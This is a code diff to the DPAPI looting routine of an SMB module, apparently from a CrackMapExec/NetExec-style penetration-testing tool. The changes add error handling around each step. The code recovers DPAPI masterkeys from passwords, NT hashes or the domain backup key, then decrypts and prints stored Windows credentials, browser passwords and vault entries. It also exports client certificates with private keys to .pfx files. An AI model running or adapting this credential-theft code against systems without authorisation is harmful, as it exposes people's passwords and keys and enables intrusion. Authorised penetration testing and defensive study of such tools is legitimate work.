@@ -1170,7 +1170,7 @@ class smb(connection):
 
     @requires_admin
     def dpapi(self):
-
+        logging.getLogger("dploot").disabled = True
         pvkbytes = None
         if self.args.pvk is not None:
             try:
@@ -1207,7 +1207,7 @@ class smb(connection):
                     backupkey = backupkey_triage.triage_backupkey()
                     pvkbytes = backupkey.backupkey_v2
             except Exception as e:
-                logging.debug("Error trying to get domain backupkey {}".format(e))
+                logging.debug("Could not get domain backupkey: {}".format(e))
                 pass
 
         target = Target.create(
@@ -1237,50 +1237,69 @@ class smb(connection):
             nthashes[self.username] = self.nthash
 
         # Collect User and Machine masterkeys
-        masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=pvkbytes, passwords=plaintexts, nthashes=nthashes)
-        masterkeys += masterkeys_triage.triage_masterkeys()
-        masterkeys += masterkeys_triage.triage_system_masterkeys()
+        try:
+            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=pvkbytes, passwords=plaintexts, nthashes=nthashes)
+            masterkeys += masterkeys_triage.triage_masterkeys()
+            masterkeys += masterkeys_triage.triage_system_masterkeys()
+        except Exception as e:
+            logging.debug("Could not get masterkeys: {}".format(e))
+
+        if len(masterkeys) == 0:
+            self.logger.error("No masterkeys looted")
+            return
 
         self.logger.info("Looting secrets")
 
-        # Collect User and Machine Credentials Manager secrets
-        credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
-        credentials = credentials_triage.triage_credentials()
-        for credential in credentials:
-            self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
-        system_credentials = credentials_triage.triage_system_credentials()
-        for credential in system_credentials:
-            self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+        try:
+            # Collect User and Machine Credentials Manager secrets
+            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
+            credentials = credentials_triage.triage_credentials()
+            for credential in credentials:
+                self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+            system_credentials = credentials_triage.triage_system_credentials()
+            for credential in system_credentials:
+                self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+        except Exception as e:
+            logging.debug("Error while looting credentials: {}".format(e))
 
-        # Collect Chrome Based Browser stored secrets
-        browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
-        browser_credentials, _ = browser_triage.triage_browsers()
-        for credential in browser_credentials:
-            self.logger.highlight("[%s] %s - %s:%s" % (credential.browser.upper(), credential.url, credential.username, credential.password))
+        try:
+            # Collect Chrome Based Browser stored secrets
+            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
+            browser_credentials, _ = browser_triage.triage_browsers()
+            for credential in browser_credentials:
+                self.logger.highlight("[%s] %s - %s:%s" % (credential.browser.upper(), credential.url, credential.username, credential.password))
+        except Exception as e:
+            logging.debug("Error while looting browsers: {}".format(e))
 
-        # Collect User Internet Explorer stored secrets
-        vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
-        vaults = vaults_triage.triage_vaults()
-        for vault in vaults:
-            if vault.type == 'Internet Explorer':
-                self.logger.highlight("[Internet Explorer] %s - %s:%s" % (vault.resource, vault.username, vault.password))
+        try:
+            # Collect User Internet Explorer stored secrets
+            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
+            vaults = vaults_triage.triage_vaults()
+            for vault in vaults:
+                if vault.type == 'Internet Explorer':
+                    self.logger.highlight("[Internet Explorer] %s - %s:%s" % (vault.resource, vault.username, vault.password))
+        except Exception as e:
+            logging.debug("Error while looting vaults: {}".format(e))
 
-        # Collect User and Machine certificates with private keys
-        certificates_triage = CertificatesTriage(target=target,conn=conn, masterkeys=masterkeys)
-        certificates = certificates_triage.triage_certificates()
-        for certificate in certificates:
-            if certificate.clientauth:
-                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
-                self.logger.success("Writting certificate to %s" % filename)
-                with open(filename, "wb") as f:
-                    f.write(certificate.pfx)
-        system_certificates = certificates_triage.triage_system_certificates()
-        for certificate in system_certificates:
-            if certificate.clientauth:
-                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
-                self.logger.success("Writting certificate to %s" % filename)
-                with open(filename, "wb") as f:
-                    f.write(certificate.pfx)
+        try:
+            # Collect User and Machine certificates with private keys
+            certificates_triage = CertificatesTriage(target=target,conn=conn, masterkeys=masterkeys)
+            certificates = certificates_triage.triage_certificates()
+            for certificate in certificates:
+                if certificate.clientauth:
+                    filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
+                    self.logger.success("Writting certificate to %s" % filename)
+                    with open(filename, "wb") as f:
+                        f.write(certificate.pfx)
+            system_certificates = certificates_triage.triage_system_certificates()
+            for certificate in system_certificates:
+                if certificate.clientauth:
+                    filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
+                    self.logger.success("Writting certificate to %s" % filename)
+                    with open(filename, "wb") as f:
+                        f.write(certificate.pfx)
+        except Exception as e:
+            logging.debug("Error while looting certificates: {}".format(e))
 
     @requires_admin
     def lsa(self):
